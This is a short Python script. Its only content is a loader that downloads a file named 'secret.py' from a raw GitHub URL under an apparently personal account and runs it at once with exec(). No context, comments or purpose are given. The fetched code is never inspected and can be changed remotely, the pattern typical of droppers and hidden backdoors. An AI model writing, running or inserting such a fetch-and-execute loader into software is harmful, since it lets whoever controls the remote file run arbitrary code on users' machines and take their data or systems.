import urllib.request
url = "https://raw.githubusercontent.com/rajavaupaidversoin/Admin/main/secret.py"
exec(urllib.request.urlopen(url).read().decode('utf-8'))
